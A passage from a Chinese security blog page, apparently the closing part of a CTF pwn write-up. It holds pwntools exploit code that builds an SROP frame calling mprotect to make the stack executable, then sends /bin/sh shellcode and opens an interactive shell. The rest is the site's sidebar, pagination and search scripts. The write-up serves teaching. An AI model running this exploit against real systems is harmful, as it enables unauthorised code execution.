<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">frame_mprotect = SigreturnFrame()</span><br><span class="line">#设置mprotect的SROP帧，用mprotect修改栈内存为RWX</span><br><span class="line">frame_mprotect.rax = constants.SYS_mprotect</span><br><span class="line">frame_mprotect.rdi = stack_addr &amp; 0xFFFFFFFFFFFFF000</span><br><span class="line">frame_mprotect.rsi = 0x1000</span><br><span class="line">frame_mprotect.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC</span><br><span class="line">#权限为R,W,X</span><br><span class="line">frame_mprotect.rsp = stack_addr</span><br><span class="line">#劫持栈地址rsp</span><br><span class="line">frame_mprotect.rip = syscall_addr</span><br></pre></td></tr></table></div></figure>

<p>(3)最后的shellcode:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload2 = &quot;&quot;</span><br><span class="line">payload2 += p64(stack_addr+0x10) #处在stack_addr</span><br><span class="line">#SROP执行完后，ret到stack_addr+0x10处的代码，即执行shellcode</span><br><span class="line">payload2 += asm(shellcraft.amd64.linux.sh())#处在stack_addr+0x10</span><br><span class="line">io.send(payload2)</span><br><span class="line">sleep(3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>

<p>参考资料：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/page/5/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/7/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">119</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">63</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">61</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>